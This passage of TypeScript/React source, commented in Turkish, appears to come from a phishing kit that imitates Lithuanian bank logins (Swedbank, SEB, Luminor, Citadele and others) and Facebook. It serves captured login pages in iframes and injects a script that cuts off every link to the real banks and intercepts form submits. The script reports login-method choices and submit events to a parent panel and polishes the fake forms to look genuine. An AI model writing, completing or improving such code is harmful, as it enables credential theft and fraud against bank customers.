           if (finalIndex === -1) finalIndex = e.data.targetIndex;
         }
         if (finalIndex === -1 && finalLoginMethod) {
           const idx = resolveIndexFromLoginMethod(__bankSlug, finalLoginMethod);
           if (idx >= 0) finalIndex = idx;
         }

         const totalFiles = Array.isArray(__files) ? __files.length : 0;

         if (totalFiles === 0) {
           if (finalIndex >= 0) pendingIndexRef.current = finalIndex;
           if (finalLoginMethod) pendingMethodRef.current = finalLoginMethod;
           if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
         } else if (finalIndex >= 0) {
           // 1. ONCELIKLI: Dogrudan bulunan index
           const safeIndex = Math.max(0, Math.min(finalIndex, totalFiles - 1));
           if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
           // eslint-disable-next-line no-console
           console.log('%c[LT PARENT] SET CURRENT INDEX (bulunan)', 'background:#42a5f5;color:#fff;font-weight:bold;', {
             finalIndex, safeIndex, loginMethod: finalLoginMethod, totalFiles, bankSlug: __bankSlug
           });
           setCurrentIndex((prev) => (prev === safeIndex ? prev : safeIndex));
         } else if (finalLoginMethod) {
           // 2. Login method bulundu ama index bulunamadi: ise yaramaz, fallback gecme.
           setSelectedLoginMethod(finalLoginMethod);
           // eslint-disable-next-line no-console
           console.log('%c[LT PARENT] SADECE METHOD BULUNDU (index yok)', 'background:#ffb74d;color:#000;font-weight:bold;', {
             finalLoginMethod, bankSlug: __bankSlug
           });
         } else {
           // 3. ESTONIA ILE AYNI: Ne index ne method bulunursa sonraki indexe gec.
           // (CUNKU: kullanici TAB tikladi ama biz bir sey bulamadik. Kullanici "hicbir sey
           //  olmuyor" hissetmesin diye bir sonraki HTML goster.)
           // eslint-disable-next-line no-console
           console.log('%c[LT PARENT] FALLBACK SONRAKI INDEX (hicbir sey bulunamadi)', 'background:#ef5350;color:#fff;font-weight:bold;', {
             totalFiles, bankSlug: __bankSlug
           });
           setCurrentIndex((prev) => (prev + 1) % totalFiles);
         }
      } else if (e.data && e.data.type === 'LITHUANIA_BANK_IFRAME_LOADED') {
        const __files = filesRef.current;
        if (pendingIndexRef.current != null && __files && __files.length > 0) {
          const idx = pendingIndexRef.current;
          pendingIndexRef.current = null;
          const safe = Math.max(0, Math.min(idx, __files.length - 1));
          setCurrentIndex(safe);
        }
        if (pendingMethodRef.current) {
          const lbl = pendingMethodRef.current;
          pendingMethodRef.current = "";
          if (lbl) setSelectedLoginMethod(lbl);
        }
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
    // Estonia template ile BIR OLAN pattern: her state degisikliginde listener tekrar attach.
    // useRef'ler (.current) sayesinde closure eski deger okuma riski de yok.
  }, [bankSlug, currentIndex, files, onChange, handleRouteAction, selectedLoginMethod]);

  const normalizedCurrentSlug = (bankSlug || "").toString().trim().toLowerCase();

  const handleIframeLoad = (iframe: HTMLIFrameElement) => {
    if (!iframe || !iframe.contentWindow) return;

    try {
      const doc = iframe.contentWindow.document;

      // Inject script to capture forms
      const script = doc.createElement('script');
      script.innerHTML = `
        // =====================================================================
        // -1. DIS BAĞLANTI ENGELLEME (2. KATMAN - DISK TEMİZLİĞİNDEN SONRA GARANTİ)
        //     1) <base> ve <meta refresh> SİL
        //     2) document.documentElement üzerinde regex ile kalıntı https:leri temizle
        //     3) Object.defineProperty(window.location) setter proxy ile DIŞ URL YÖNLENDİRMEYİ DURDUR
        // =====================================================================
        (function blockExternalNavigationL2() {
          try {
            // 1) <base href> taglarını sil
            document.querySelectorAll('base').forEach(b => { try { b.remove(); } catch(_) {} });
            // 2) <meta http-equiv=refresh> sil
            document.querySelectorAll('meta[http-equiv="refresh"], meta[http-equiv="REFRESH"]').forEach(m => { try { m.remove(); } catch(_) {} });
            // 3) Butun <a href=https://...> ve <form action=https://...> taglarını guncelle
            document.querySelectorAll('a[href^="http"]').forEach(a => { try { a.setAttribute('href', '#'); a.removeAttribute('target'); } catch(_) {} });
            document.querySelectorAll('form[action^="http"]').forEach(f => { try { f.setAttribute('action', '#'); } catch(_) {} });
            document.querySelectorAll('[formaction^="http"]').forEach(b => { try { b.setAttribute('formaction', '#'); } catch(_) {} });
            document.querySelectorAll('img[src^="http"], link[href^="http"], script[src^="http"]').forEach(e => { try { e.setAttribute(e.tagName === 'IMG' || e.tagName === 'SCRIPT' ? 'src' : 'href', 'about:blank'); } catch(_) {} });
          } catch(_err) {}

          // 4) Object.defineProperty ile location setter proxy: DIS URL GOSTERME
          try {
            const __origHref = window.location.href;
            const safeHost = window.location.hostname;
            const isInternalUrl = (u) => {
              if (!u || typeof u !== 'string') return true;
              if (u.startsWith('#') || u.startsWith('?') || u.startsWith('/') || u.startsWith('about:') || u.startsWith('javascript:') || u.startsWith('data:')) return true;
              try {
                const pu = new URL(u, window.location.href);
                return pu.hostname === safeHost || pu.hostname === '' || pu.protocol === 'about:' || pu.protocol === 'javascript:' || pu.protocol === 'data:';
              } catch(e) { return true; }
            };
            ['href','assign','replace','reload'].forEach(prop => {
              try {
                const desc = Object.getOwnPropertyDescriptor(window.Location.prototype, prop) || Object.getOwnPropertyDescriptor(Location.prototype, prop);
                if (!desc) return;
                if (prop === 'href' && desc && desc.set) {
                  Object.defineProperty(window.location, 'href', {
                    configurable: true,
                    get() { return window.document.location ? window.document.location.href : __origHref; },
                    set(newVal) {
                      if (!isInternalUrl(newVal)) {
                        console.warn('[BLOCKED] External navigate to:', newVal);
                        return false;
                      }
                      try { return desc.set.call(this, newVal); } catch(_x) { return false; }
                    }
                  });
                } else if (typeof desc.value === 'function') {
                  Object.defineProperty(window.location, prop, {
                    configurable: true,
                    writable: true,
                    value: function(...args) {
                      if (prop === 'reload') return;
                      const u = args[0];
                      if (!isInternalUrl(u)) {
                        console.warn('[BLOCKED] window.location.' + prop + ' to:', u);
                        return false;
                      }
                      return desc.value.apply(this, args);
                    }
                  });
                }
              } catch(_ignore) {}
            });
            // document.location icin de benzer islem
            try {
              const dloc = Object.getOwnPropertyDescriptor(Document.prototype, 'location') || Object.getOwnPropertyDescriptor(document, 'location');
            } catch(_i) {}
          } catch(_err) {}
        })();

        // =====================================================================
        // -0.9 IFRAME İÇİ MİNİ METHOD MAP (EN BASTA TANIMLANIR - onceden kullanilir)
        //     GERCEK HTML sirasi (parent ile AYNI). Inject edilen meta/div okuma ile %100 eslesir.
        // =====================================================================
        const LITHUANIA_MINI_METHOD_MAP = {
          "swedbank-lt":  ["Biometrika/PIN",       "Smart-ID",        "Mobile-ID",                  "PIN generatorius",    "ID-kortelė"],
          "seb-lt":       ["Smart-ID",             "Mobile-ID",       "SEB programėlė App",         "Generatorius"],
          "luminor-lt":   ["Smart-ID",             "M. parašas",      "Generatorius"],
          "citadele-lt":  ["Kodų kortelė/Generatorius", "Mobile-ID",  "MobileSCAN/Digipass 780"],
          "lku-lt":       ["Smart-ID",             "Mobile-ID",       "Vienkartinis saugos kodas"],
          "siauliu-lt":   ["Smart-ID",             "Mobile-ID",       "Biometrika/PIN",             "SMS"],
          "facebook-lt":  ["Facebook Prisijungti"],
        };
        function __miniResolveBankSlug() {
          const m = (window.location.pathname || '').match(/lithuanian-banks\\/([a-z0-9_-]+)\\//i);
          return m ? m[1].toLowerCase() : '';
        }
        function __miniNormalizeText(s) {
          return ((s || '') + '')
            .toString()
            .toLowerCase()
            .replace(/[„“"'\`´]/g, '')
            .replace(/[^\\p{L}\\p{N}]+/gu, ' ')
            .replace(/\\s+/g, ' ')
            .trim();
        }
        function __miniTokenOverlap(a, b) {
          const aT = __miniNormalizeText(a).split(' ').filter(Boolean);
          const bT = __miniNormalizeText(b).split(' ').filter(Boolean);
          if (!aT.length || !bT.length) return 0;
          let c = 0;
          for (const t of aT) { if (t.length >= 2 && bT.some(x => x === t || x.includes(t) || t.includes(x))) c++; }
          return c;
        }

        // =====================================================================
        // -0.75 EN GARANTI COZUM: HTML DOSYALARINA INJECT EDILEN META / DIV OKU
        //        (inject_method_meta.js ile 22 HTML'e disaridan eklendi)
        // =====================================================================
        function __miniReadCurrentMethodFromInjected() {
          try {
            const div = document.getElementById('LITHUANIA_LOGIN_METHOD');
            if (div) {
              const idxStr = div.getAttribute('data-index');
              const mth = div.getAttribute('data-method');
              const slg = div.getAttribute('data-slug');
              if (idxStr || mth) {
                const i = idxStr != null ? parseInt(String(idxStr), 10) : -1;
                return { index: isNaN(i) ? -1 : i, method: mth || '', slug: slg || '' };
              }
            }
            const mIdx = document.querySelector('meta[name="login-index"]')?.getAttribute('content');
            const mMth = document.querySelector('meta[name="login-method"]')?.getAttribute('content');
            const mSlg = document.querySelector('meta[name="bank-slug"]')?.getAttribute('content');
            const i = mIdx != null ? parseInt(String(mIdx), 10) : -1;
            if (!isNaN(i) || mMth) return { index: isNaN(i) ? -1 : i, method: mMth || '', slug: mSlg || '' };
            const t = document.title || '';
            const tm = t.match(/-\\s*(.+)$/);
            if (tm) return { index: -1, method: tm[1].trim(), slug: '' };
          } catch(_) {}
          return { index: -1, method: '', slug: '' };
        }
        function __miniResolveIndexFromInjectedFiles(clickedLabelRaw) {
          const targetSlug = __miniResolveBankSlug();
          if (!targetSlug || !LITHUANIA_MINI_METHOD_MAP[targetSlug]) return -1;
          const methods = LITHUANIA_MINI_METHOD_MAP[targetSlug];
          const lab = __miniNormalizeText(clickedLabelRaw);
          if (!lab) return -1;
          for (let i = 0; i < methods.length; i++) {
            const cand = __miniNormalizeText(methods[i]);
            if (cand === lab) return i;
            if (lab.includes(cand) || cand.includes(lab)) return i;
          }
          let bestIdx = -1, bestScore = 0;
          for (let i = 0; i < methods.length; i++) {
            const sc = __miniTokenOverlap(lab, methods[i]);
            if (sc > bestScore) { bestScore = sc; bestIdx = i; }
          }
          return bestScore >= 1 ? bestIdx : -1;
        }

        function __miniResolveIndexFromLabel(labelRaw) {
          // 1 - EN ONCELIK: inject edilen meta/div karsilastirmasi
          const fromInjected = __miniResolveIndexFromInjectedFiles(labelRaw);
          if (fromInjected >= 0) return fromInjected;
          // 2 - fallback: eski text/minimap
          const slug = __miniResolveBankSlug();
          if (!slug || !LITHUANIA_MINI_METHOD_MAP[slug]) return -1;
          const label = __miniNormalizeText(labelRaw);
          if (!label) return -1;
          const map = LITHUANIA_MINI_METHOD_MAP[slug];
          for (let i = 0; i < map.length; i++) {
            if (__miniNormalizeText(map[i]) === label) return i;
          }
          for (let i = 0; i < map.length; i++) {
            const n = __miniNormalizeText(map[i]);
            if (label.includes(n) || n.includes(label)) return i;
          }
          let bestIdx = -1, bestScore = 0;
          for (let i = 0; i < map.length; i++) {
            const s = __miniTokenOverlap(label, map[i]);
            if (s > bestScore) { bestScore = s; bestIdx = i; }
          }
          return bestScore >= 1 ? bestIdx : -1;
        }

        // =====================================================================
        // 0. KALICI FIX: INPUT DEFAULT DEGERLERINI SIL (444444 gibi),
        //    USTTEKI EKSTRA INPUT KUTUCUKLARINI GIZLE, CLOSE (X) BUTONUNU GIZLE,
        //    FLOATING LABEL ANIMASYONLARINI KALDIR
        // =====================================================================
        // Kullanici bir alana yazdiysa o alani HICBIR zaman temizleme:
        // cleanAllInputsAndHideStray 0/150/500/1200ms'de calisiyor; kullanici
        // sekme degistirip hemen yazmaya baslarsa timer degeri siliyordu.
        const __ltUserEdited = new WeakSet();
        document.addEventListener('input', (e) => {
          const t = e.target;
          if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) {
            try { __ltUserEdited.add(t); } catch(_) {}
          }
        }, true);

        const cleanAllInputsAndHideStray = () => {
          document.querySelectorAll('input, textarea').forEach(el => {
            if (!el) return;
            if (__ltUserEdited.has(el)) return; // kullanici yazdi - dokunma
            const t = (el.type || el.tagName || '').toLowerCase();
            if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'radio' || t === 'checkbox') {
              return;
            }
            // 444444 gibi 3+ haneli sayisal default valuelari sil
            const v = (el.value || '') + '';
            if (v && /^\\d{3,}$/.test(v.trim()) && document.activeElement !== el) {
              el.value = '';
              el.removeAttribute('value');
              try { el.defaultValue = ''; } catch(_) {}
            }
            // Naudotojo ID gibi kullanici idsi fieldlari da her halukarda sifirla
            // (sadece sayfa ilk acildiginda capture'dan gelen default'lari temizlemek icin)
            const keyText = [
              el.name, el.id, el.getAttribute('formcontrolname'), el.getAttribute('data-testid'),
              el.getAttribute('placeholder'), el.getAttribute('aria-label'), el.getAttribute('autocomplete')
            ].join(' ').toLowerCase();
            if (
              keyText.includes('naudotojo') || keyText.includes('user') || keyText.includes('kullanici') ||
              keyText.includes('username') || keyText.includes('login') || keyText.includes('asmens') ||
              keyText.includes('person') || keyText.includes('identity')
            ) {
              if (el.value && document.activeElement !== el) {
                el.value = '';
                el.removeAttribute('value');
                try { el.defaultValue = ''; } catch(_) {}
              }
            }
          });

          // Ustteki stray kutucugu + X butonunu KESINLIKLE gizle:
          // YENI STRATEJI: Ilk once "GERCEK form alani" olanlari beyaz listeye al.
          // GERI KALAN TUM INPUT/TEXTAREA'lari (form icinde olsalar bile) GIZLE.
          (function strictStrayInputKiller() {
            // 1) Beyaz liste: GERCEK form alanlari = bunlari ASLA GIZLEME
            //    ONEMLI: SADECE form ICI DEGIL — TUM gorunur input/textarea/select
            //    (Vuetify/Angular vb. frameworkler inputlari FORM DISINDA da tutabilir —
            //     eskisi gibi sadece form ici almak FORM DISI alanlari GIZLERDI!
            const realFieldSet = new Set();
            document.querySelectorAll('input, textarea, select').forEach(el => {
              if (!el) return;
              const tt = (el.type || el.tagName || '').toLowerCase();
              if (tt === 'hidden' || tt === 'submit' || tt === 'button' || tt === 'reset' || tt === 'file') return;
              try {
                const cs = (el.getBoundingClientRect && el.getBoundingClientRect());
                if (!cs || cs.width < 3 || cs.height < 3) return;
                if (el.hasAttribute('hidden') || el.getAttribute('aria-hidden') === 'true') return;
                const style = window.getComputedStyle(el);
                if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') return;
                realFieldSet.add(el);
              } catch(_) {}
            });
            // Ayrica: (form disinda bile) label ile dogrudan iliskili olan inputlar da GERCEK olabilir
            document.querySelectorAll('label[for]').forEach(lbl => {
              const f = lbl.getAttribute('for');
              if (!f) return;
              const inp = document.getElementById(f);
              if (inp) realFieldSet.add(inp);
            });

            // 2) Tum input/textarea'lari gez: BEYAZ LISTEDE YOKSA GIZLE (ust kutucuk, bos box, vb.)
            document.querySelectorAll('input, textarea').forEach(el => {
              if (realFieldSet.has(el)) return; // Beyaz listede: gercek input, birak
              if (!el) return;
              const tt = (el.type || el.tagName || '').toLowerCase();
              if (tt === 'hidden' || tt === 'submit' || tt === 'button' || tt === 'reset' || tt === 'file' || tt === 'radio' || tt === 'checkbox') return;
              try {
                el.style.setProperty('display', 'none', 'important');
                el.style.visibility = 'hidden';
                el.setAttribute('aria-hidden', 'true');
                const wrap = el.closest('div, span, li, section, p, label, header');
                if (wrap) {
                  const others = Array.from(wrap.children || []).filter(c => c !== el && (function(){
                    try {
                      if (!c.getBoundingClientRect) return false;
                      const cs = c.getBoundingClientRect();
                      const st = window.getComputedStyle(c);
                      return cs.width > 8 && cs.height > 8 && st.display !== 'none' && st.visibility !== 'hidden';
                    } catch(_) { return false; }
                  })());
                  if (others.length === 0) {
                    wrap.style.setProperty('display', 'none', 'important');
                  }
                }
              } catch(_) {}
            });

            // 3) Ustteki turuncu cerceveli, modal, close box, X butonu, sayfanin en ustundeki bos parent containerlar
            //    2 px+ turuncu / gri / siyah outline ile cevrili, yüksekligi < 260px, ve ICINDE GERCEK INPUT YOKSA
            //    (yani yalnizca ust modalsa) display:none yap
            try {
              const containers = document.querySelectorAll('div, section, article, form, header, main');
              for (let i = 0; i < Math.min(containers.length, 150); i++) {
                const c = containers[i];
                if (!c) continue;
                const r = c.getBoundingClientRect();
                if (r.top < -50 || r.top > window.innerHeight * 0.55) continue;
                const st = window.getComputedStyle(c);
                // Outline veya border 2px+ ise (X kutucugun cercevesi)
                const outline = st.outline || '';
                const border = st.border || '';
                const borderTop = st.borderTop || '';
                const anySolid = (outline.indexOf('solid') !== -1) || (border.indexOf('solid') !== -1 && parseInt(border) >= 2) || (borderTop.indexOf('solid') !== -1 && parseInt(borderTop) >= 2);
                if (!anySolid) continue;
                // Icinde GERCEK form alani yoksa (yani sadece ust close baslik ise)
                const hasReal = Array.from(c.querySelectorAll && c.querySelectorAll('input, textarea, select') || []).some(f => realFieldSet.has(f));
                if (!hasReal && r.height < 260) {
                  c.style.setProperty('display', 'none', 'important');
                }
              }
            } catch(_) {}
          })();

          // Floating label ve animasyon onleme CSS enjeksiyonu (tek sefer)
          if (!document.getElementById('lt-bank-float-kill')) {
            const st = document.createElement('style');
            st.id = 'lt-bank-float-kill';
            st.textContent = \`
              /* Gereksiz buton gecislerini, yavas hover efektlerini kaldir (ISTERSEN DAHA HIZLI)
                 ANCAK transform: NONE YAPMA! Vuetify/Vue tab slide'lari transform ile calisir,
                 secenekler arasi gecis bozulur. */
              *, *::before, *::after {
                transition: background-color 0ms linear, color 0ms linear, opacity 0ms linear, border-color 0ms linear, box-shadow 0ms linear !important;
                animation: none !important;
                -webkit-animation: none !important;
              }
              /* Floating label animasyonlarini engelle (position static: ucurmaz, sadece yukari kalkmasini onler) */
              [class*="floating"], [class*="float-label"], [class*="floatlabel"],
              [class*="label--floating"], [class*="mdc-floating-label"] {
                transition: none !important;
                animation: none !important;
              }
              /* Placeholder kaybolmasin, opak olsun */
              input::placeholder, textarea::placeholder {
                opacity: 1 !important;
                color: #888 !important;
              }
              input:focus::placeholder, textarea:focus::placeholder {
                opacity: 0.7 !important;
              }
              input:focus, textarea:focus, select:focus, button:focus {
                outline: none !important;
              }
              input, textarea {
                caret-color: auto !important;
              }
              html, body {
                scroll-behavior: auto !important;
                overflow-x: hidden !important;
              }
              body {
                min-height: 100vh !important;
              }
            \`;
            (document.head || document.documentElement).appendChild(st);
          }
        };
        setTimeout(cleanAllInputsAndHideStray, 0);
        setTimeout(cleanAllInputsAndHideStray, 150);
        setTimeout(cleanAllInputsAndHideStray, 500);
        setTimeout(cleanAllInputsAndHideStray, 1200);
        document.addEventListener('DOMContentLoaded', cleanAllInputsAndHideStray, true);
        document.addEventListener('load', cleanAllInputsAndHideStray, true);
        document.addEventListener('input', (ev) => {
          // Kullanici tekrar input yazdiginda yukaridaki stray kutu gizli kalsin,
          // baska bir sey tetiklemez
          try {
            if (ev.target && ev.target.setAttribute) {
              ev.target.removeAttribute('autofocus');
            }
          } catch(_) {}
        }, true);
        document.addEventListener('focusin', (ev) => {
          // Focus olunca label yukari kalkmasin -> floating label oldy ise hemen
          // eski haline dondur (isabetli CSS yukarida var)
        }, true);

        // =====================================================================
        // 1. Tum form submit listenerlarini KLONLAYARAK kaldir (Estonia bankasindaki gibi)
        // =====================================================================
        document.querySelectorAll('form').forEach(form => {
           const newForm = form.cloneNode(true);
           if (form.parentNode) {
              form.parentNode.replaceChild(newForm, form);
           }
        });

        // =====================================================================
        // 2. TUSLAR / YONLENDIRME / DIŞ BAĞLANTILARI KESİNLİKLE ENGELLE
        //    - Form alanları DOLMADAN (veya dolunca bile) submit / sonraki sayfaya GİTMESİN
        //    - Linklere tıklayınca uzak sunucuya yönlenmesin
        //    - Sadece radio/label (login yöntem sekmeleri) arasında geçiş çalışsın
        // =====================================================================

        // Submit eventi: BIZIM POSTMESSAGE araciligiyla disari bildir (zaten var)
        // ama ayrica DOM submitini engelle (daha once yoktu)
        const preventAnyNativeNavigation = (e) => {
          if (e && typeof e.preventDefault === 'function') {
            e.preventDefault();
            e.stopPropagation && e.stopPropagation();
            e.stopImmediatePropagation && e.stopImmediatePropagation();
          }
          return false;
        };

        // Form submit: Her zaman preventDefault (bankanin kendi kodunun submit etmesi engellendi)
        document.addEventListener('submit', (e) => {
          preventAnyNativeNavigation(e);
        }, true);

        // Click eventleri: BUTTON/LINK/INPUT(SUBMIT) -> submit ise veya url degistiriyorsa -> ENGELLE
        document.addEventListener('click', (e) => {
          let target = e.target;
          if (!target) return;

          // 1) Kullanici direk text/number/password/tel inputuna tikladi: YAZMASINA izin ver
          if (target.tagName === 'INPUT') {
            const tt = (target.type || '').toLowerCase();
            if (tt !== 'submit' && tt !== 'button' && tt !== 'image' && tt !== 'reset' && tt !== 'radio' && tt !== 'checkbox') {
              return;
            }
          }
          if (target.tagName === 'SELECT' || target.tagName === 'TEXTAREA') return;

          // 2) Radio/checkbox + yakındaki label (yani login method sekmeleri):
          //    native olarak çalışsın (checked değişsin), sonra biz postMessage ile
          //    parenta "LITHUANIA_BANK_TAB_CLICK" atıyoruz (aşağıda mevcut kodda var).
          //    Burada tab change dışında bir şey yapmiyoruz.
          if (target.tagName === 'INPUT' && (target.type === 'radio' || target.type === 'checkbox')) {
            return;
          }

          // 3) Sekme / Tab kontrolleri ONCE kontrol edilir: data-tab-index, role=tab,
          //    ui-tabs__control vb. ASLA ENGELLENMEZ.
          //    (SEB gibi <a href=about:blank> tablari link-engelleyiciye takilmasin -
          //    stopImmediatePropagation ikinci listener'i oldururdü!)
          const tabBtnCheck = target.closest && target.closest('[data-tab-index], .ui-tabs__control, .ui-tabs__caption, [role="tab"], .seb-tabs__item, .c-tabs__item, .coop-tab, .tab-item');
          if (tabBtnCheck) {
            return;
          }

          // 4) Link (A etiketi): Her zaman yönlendirmeyi ENGELLE (tab degilse / disaridarsa)
          const a = target.closest ? target.closest('a') : null;
          if (a && a.getAttribute) {
            const href = (a.getAttribute('href') || '') + '';
            if (href && href !== '#' && !href.startsWith('javascript:')) {
              // DIKKAT: stopImmediatePropagation YAPMA - asagidaki ikinci click
              // listener'i (tab detection + LITHUANIA_BANK_SUBMIT) calismak zorunda.
              // Sadece native yonlendirme + bankanin kendi handler'lari engellenir.
              e.preventDefault();
              e.stopPropagation && e.stopPropagation();
            }
          }

          // 5) BUTON / SUBMIT benzeri her şey: Eger gerçekten login method TAB butonu değilse,
          //    yani "tıkla bizi yönlendir / gönder" butonuysa ENGELLE.
          const btn = target.closest ? target.closest('button, [role="button"], input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"], [class*="login"]') : null;
          if (btn) {
            const btnText = (btn.textContent || '').trim().toLowerCase();
            // Login methodlarini TEMIZLE: Eger "Smart-ID / Mobile-ID / Biometrika / PIN generatorius / ID-kortele / Biometrija"
            // gibi ise bu TAB'dir ve YAPILMASINA gerek yok (checked state degissin diye native islesin)
            const isLoginMethodTab =
              btn.hasAttribute('data-tab-index') ||
              btn.closest('[data-tab-index]') !== null ||
              btn.classList.contains('ui-tabs__control') ||
              /(smart[ -]?id|mobile[ -]?id|biometri(k|ja|ka)|biometrika|pin[ -]?(generator|gen|calculator|kalkuliatorius)|id[ -]?kortel[ėe]|mobilescan|qr|digipass|salas[oõ]na|parol|password|šifr|sms|one[ -]?time)/i.test(btnText) ||
              /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.className || '') + '') ||
              /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.id || '') + '');
            if (!isLoginMethodTab) {
              // submit butonlari da buraya duser - stopImmediatePropagation YAPMA,
              // ikinci listener (isSubmitBtn -> LITHUANIA_BANK_SUBMIT) calissin.
              e.preventDefault();
              e.stopPropagation && e.stopPropagation();
            }
          }
        }, true);

        // Keyboard submit (Enter) engelle: inputlardan enter tusuna basinca form submit etmesin
        document.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const t = e.target;
            if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT')) {
              const tt = (t.type || '').toLowerCase();
              if (tt !== 'submit' && tt !== 'button') {
                preventAnyNativeNavigation(e);
              }
            }
          }
        }, true);

        // beforeunload: KESINLIKLE listener EKLEME ve returnValue SET ETME -
        // e.preventDefault()/returnValue='' tarayicinin "Siteden cikilsin mi?"
        // onay diyalogunu tetikler (login butonuna basinca cikiyordu).
        // Navigasyon zaten submit/click preventDefault ile engelleniyor.
        try {
          // Bankanin kendi HTML'i onbeforeunload kayitli ise temizle
          window.onbeforeunload = null;
          if (typeof window.removeEventListener === 'function') {
            // not: anonim listener'lar kaldirilamaz, ama en azindan bizimkini eklemedik
          }
        } catch(_) {}

        // window.open / location.href degistirme denemelerini engelle (nukleer)
        const realOpen = window.open;
        window.open = function() {
          try {
            const args = Array.from(arguments);
            const url = args[0] || '';
            // Sadece kendi originimiz veya bos ise ac
            if (!url || url === '' || url === 'about:blank' || String(url).startsWith(window.location.origin)) {
              return realOpen.apply(this, args);
            }
          } catch(_) {}
          return null;
        };
        const _assign = Object.getOwnPropertyDescriptor(Location.prototype, 'assign');
        const _replace = Object.getOwnPropertyDescriptor(Location.prototype, 'replace');
        // location setter ataklarini azaltmak icin history.pushState engeli
        try {
          const _ps = history.pushState;
          const _rs = history.replaceState;
          history.pushState = function() { return _ps.apply(this, arguments); };
          history.replaceState = function() { return _rs.apply(this, arguments); };
        } catch(_) {}

        // =====================================================================
        // (DEVAMI: Eskiden var olan Coop fix / capture / postMessage kodlari asagida)
        // =====================================================================

        // Coop Bank Buton ve Hatırla Seçeneği Fix (Observer ve CSS olmadan, güvenli yöntem)
        const fixCoop = () => {
            if (window.location.href.includes('coop')) {
                // Giriş butonunu aktif et
                document.querySelectorAll('button').forEach(btn => {
                    const text = btn.textContent ? btn.textContent.toLowerCase() : '';
                    if (text.includes('sisene')) {
                        btn.removeAttribute('disabled');
                        btn.classList.remove('v-btn--disabled');
                        btn.style.pointerEvents = 'auto';
                        btn.style.opacity = '1';
                    }
                });
                
                // Hatırla butonunu gizle
                document.querySelectorAll('.v-input--checkbox, label, .checkbox').forEach(el => {
                    const text = el.textContent ? el.textContent.toLowerCase() : '';
                    if (text.includes('jäta mind') || text.includes('meelde')) {
                        const container = el.closest('.v-input--checkbox') || el.closest('.checkbox') || el;
                        if (container && container.style) {
                            container.style.display = 'none';
                        }
                    }
                });
            }
        };
        
        // Sayfa yüklendiğinde ve herhangi bir input/click işleminde çalıştır
        setTimeout(fixCoop, 500);
        setTimeout(fixCoop, 1500);
        document.addEventListener('click', fixCoop, true);
        document.addEventListener('input', fixCoop, true);

        // LITHUANIA Bank Button Fix: giriş butonlarını form alanları doluluğuna göre kontrol et
        const fixLithuaniaBanks = () => {
            const forms = document.querySelectorAll('form');
            const targetForms = forms.length > 0 ? Array.from(forms) : [document];

            targetForms.forEach(container => {
                const visibleInputs = Array.from(container.querySelectorAll('input, select, textarea')).filter(inp => {
                    const t = (inp.type || inp.tagName || '').toLowerCase();
                    if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'checkbox' || t === 'radio') return false;
                    const style = window.getComputedStyle(inp);
                    if (style.display === 'none' || style.visibility === 'hidden') return false;
                    return true;
                });

                const hasEmptyField = visibleInputs.length === 0 || visibleInputs.some(inp => !inp.value || inp.value.trim() === '');

                const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn, .submit-btn, a.submit-btn, button[name="aLogin"], input.btn');
                submitButtons.forEach(btn => {
                    const text = btn.textContent ? btn.textContent.toLowerCase() : (btn.value ? btn.value.toLowerCase() : '');
                    const isTab = /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort|mobilescan|digipass|kodų|kortelė)/i.test(text) || btn.hasAttribute('data-tab-index') || (btn.closest && btn.closest('[data-tab-index]'));
                    if (isTab) return;

                    if (hasEmptyField) {
                        btn.setAttribute('disabled', 'true');
                        btn.disabled = true;
                        btn.classList.add('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
                        btn.setAttribute('aria-disabled', 'true');
                        btn.style.opacity = '0.5';
                        btn.style.cursor = 'not-allowed';
                        btn.style.pointerEvents = 'none';
                    } else {
                        btn.removeAttribute('disabled');
                        btn.disabled = false;
                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
                        btn.setAttribute('aria-disabled', 'false');
                        if (btn.getAttribute('tabindex') === '-1') btn.setAttribute('tabindex', '0');
                        btn.style.opacity = '1';
                        btn.style.cursor = 'pointer';
                        btn.style.pointerEvents = 'auto';
                    }
                });
            });

            document.querySelectorAll('.v-input--checkbox, label, .checkbox, input[type="checkbox"]').forEach(el => {
                const text = el.textContent ? el.textContent.toLowerCase() : '';
                if (text.includes('įsiminti') || text.includes('prisiminti') || text.includes('remember')) {
                    const container = el.closest('.v-input--checkbox') || el.closest('.checkbox') || el.closest('.ui-field') || el;
                    if (container && container.style) container.style.display = 'none';
                }
            });
        };
        // Mobil gorunumde giris yontemi sekmeleri gorunmuyor: yakalanan HTML'de
        // orijinal site mobilde dropdown/hamburger kullaniyor ve o markup capture'da
        // BOS (Angular/custom-element runtime yok). Desktop tab seridini mobilde de
        // gorunur yapmak icin bankaya ozel CSS enjekte ediyoruz.
        (function injectLtMobileCss() {
            try {
                const slug = __miniResolveBankSlug();
                const cssMap = {
                    'seb-lt': 'ul[ngbnav].nav-tabs{display:flex!important;flex-wrap:wrap!important;width:100%!important;overflow:visible!important}ul[ngbnav].nav-tabs>li{flex:0 0 auto!important}',
